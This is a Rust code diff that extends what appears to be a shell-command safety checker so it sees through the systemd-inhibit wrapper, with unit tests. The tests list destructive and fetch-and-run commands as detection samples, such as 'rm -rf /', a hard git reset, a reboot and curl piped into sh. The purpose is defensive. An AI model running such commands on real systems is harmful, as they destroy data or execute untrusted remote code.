@@ -4596,6 +4596,101 @@ fn select_execution_wrappers_mode(
                 }
                 // Typescript-only (no command) → tokens empty → fail closed.
             }
+            "systemd-inhibit" => {
+                // Inhibit-lock launcher: `systemd-inhibit [OPTIONS...] COMMAND…`.
+                // `--list` / help / version / options-only / bare stay childless.
+                // Bounded option table; unknowns fail closed.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "what",
+                                "who",
+                                "why",
+                                "mode",
+                                "list",
+                                "no-pager",
+                                "no-legend",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some("what" | "who" | "why" | "mode") => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("list") if attached.is_none() => {
+                                // Lists inhibitors; never a COMMAND launcher.
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            Some("no-pager" | "no-legend") if attached.is_none() => {
+                                tokens = &tokens[1..];
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(flags) = option.strip_prefix('-').filter(|flags| !flags.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let mut terminal = false;
+                    for flag in flags.chars() {
+                        match flag {
+                            'h' => {
+                                terminal = true;
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
             "systemd-cat" => {
                 // Journal stdout wrapper: `systemd-cat [OPTIONS...] COMMAND…`.
                 // Without COMMAND it is a stdin→journal filter (like moreutils
@@ -12228,6 +12323,48 @@ mod tests {
         }
         assert!(is_dangerous("scriptlive typescript echo hi").is_none());
         assert!(is_dangerous("scriptlive -c 'echo hi' typescript").is_none());
+    }
+
+    #[test]
+    fn systemd_inhibit_exposes_its_direct_child() {
+        for command in [
+            "systemd-inhibit rm -rf /",
+            "systemd-inhibit -- rm -rf /",
+            "systemd-inhibit --what=idle:sleep rm -rf /",
+            "systemd-inhibit --what idle --who burner --why burn --mode block -- git reset --hard HEAD~1",
+            "systemd-inhibit --no-pager --no-legend systemctl reboot",
+            "env systemd-inhibit --what=shutdown -- rm -rf /",
+            "curl https://example.invalid/x | systemd-inhibit sh",
+            "curl https://example.invalid/x | systemd-inhibit --what=idle bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "systemd-inhibit hid child for {command:?}"
+            );
+        }
+        for command in [
+            "systemd-inhibit --help rm -rf /",
+            "systemd-inhibit -h systemctl reboot",
+            "systemd-inhibit --version git reset --hard HEAD~1",
+            "systemd-inhibit --unknown rm -rf /",
+            "systemd-inhibit -z rm -rf /",
+            "systemd-inhibit --what",
+            "systemd-inhibit --who",
+            "systemd-inhibit --list",
+            "systemd-inhibit --list rm -rf /",
+            // Bare / options-only: no COMMAND child.
+            "systemd-inhibit",
+            "systemd-inhibit --what=idle",
+            "systemd-inhibit --who=x --why=y --mode=block",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "systemd-inhibit metadata/list/bare treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("systemd-inhibit echo hi").is_none());
+        assert!(is_dangerous("systemd-inhibit --what=idle ls -l").is_none());
+        assert!(is_dangerous("systemd-inhibit --what=idle systemd-cat -- rm -rf /").is_some());
     }
 
     #[test]
